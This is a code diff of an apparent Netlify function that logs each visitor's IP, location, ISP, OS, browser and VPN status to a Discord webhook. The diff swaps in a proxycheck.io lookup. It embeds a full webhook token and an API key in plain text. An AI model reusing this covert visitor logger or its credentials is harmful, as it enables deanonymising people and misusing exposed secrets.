@@ -1,5 +1,6 @@
 exports.handler = async (event) => {
   const webhookURL = "https://discord.com/api/webhooks/1379270305272299530/EdXC7ENWy6IzQiR1-ETKyeyitOmG_It2088qG3SROttMnLqzvp6YV879Wqs-WwIYa4yk";
+  const proxyCheckKey = "953802-7ll18a-88031m-g5gz09";
 
   const ip =
     event.headers["x-nf-client-connection-ip"] ||
@@ -10,7 +11,6 @@ exports.handler = async (event) => {
   const userAgent = event.headers["user-agent"] || "Unknown UA";
   const timestamp = new Date().toISOString();
 
-  // Improved OS detection
   const detectOS = (ua) => {
     const l = ua.toLowerCase();
     if (l.includes("ipad") || (l.includes("macintosh") && l.includes("mobile"))) return "iPadOS";
@@ -22,7 +22,6 @@ exports.handler = async (event) => {
     return "Unknown";
   };
 
-  // Simple browser detection
   const detectBrowser = (ua) => {
     const l = ua.toLowerCase();
     if (l.includes("edg/")) return "Edge";
@@ -35,6 +34,7 @@ exports.handler = async (event) => {
   };
 
   try {
+    // Get location info
     const geoRes = await fetch(`http://ipwho.is/${ip}`);
     const geoData = await geoRes.json();
 
@@ -42,15 +42,13 @@ exports.handler = async (event) => {
       country = "N/A",
       region = "N/A",
       city = "N/A",
-      proxy = false,
-      vpn = false,
-      connection = {}
+      connection: { domain: connectionDomain = "N/A" } = {},
     } = geoData;
 
-    const ispDomain = connection.domain || "N/A";
-
-    // VPN/Proxy flag = true if either proxy or vpn is true
-    const vpnProxy = proxy || vpn;
+    // Get proxy/vpn info
+    const proxyRes = await fetch(`https://proxycheck.io/v2/${ip}?key=${proxyCheckKey}&vpn=1&asn=1`);
+    const proxyData = await proxyRes.json();
+    const vpn = proxyData[ip]?.proxy === "yes";
 
     const os = detectOS(userAgent);
     const browser = detectBrowser(userAgent);
@@ -59,10 +57,10 @@ exports.handler = async (event) => {
       content: `New Visitor Logged
 **IP**: ${ip}
 **Location**: ${city}, ${region}, ${country}
-**ISP**: ${ispDomain}
+**ISP**: ${connectionDomain}
 **OS**: ${os}
 **Browser**: ${browser}
-**VPN/Proxy**: ${vpnProxy}
+**VPN/Proxy**: ${vpn}
 **Time**: ${timestamp}`
     };
 
